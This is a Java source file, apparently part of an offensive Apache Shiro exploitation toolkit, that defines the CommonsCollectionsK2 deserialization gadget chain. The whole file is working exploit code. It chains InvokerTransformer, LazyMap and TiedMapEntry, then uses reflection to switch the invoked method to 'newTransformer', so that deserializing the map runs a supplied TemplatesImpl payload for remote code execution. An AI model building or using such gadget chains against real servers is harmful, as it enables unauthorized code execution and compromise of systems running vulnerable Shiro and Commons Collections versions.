package com.liev.clouds.payload.shiro;

import com.liev.clouds.annotation.Authors;
import com.liev.clouds.annotation.Dependencies;
import com.liev.clouds.utils.shiroutils.ReflectionsUtils;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

import java.util.HashMap;
import java.util.Map;


@Dependencies({"commons-collections:commons-collections4:4.0"})
@Authors({"KORLR"})
public class CommonsCollectionsK2 implements ObjectPayload<Map> {
    @Override
    public Map getObject(Object tpl) throws Exception {
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        HashMap<String, String> innerMap = new HashMap<>();
        LazyMap lazyMap = LazyMap.lazyMap(innerMap, (Transformer)transformer);

        Map<Object, Object> outerMap = new HashMap<>();
        TiedMapEntry tied = new TiedMapEntry((Map)lazyMap, tpl);
        outerMap.put(tied, "t");

        innerMap.clear();

        ReflectionsUtils.setFieldValue(transformer, "iMethodName", "newTransformer");
        return outerMap;
    }
}


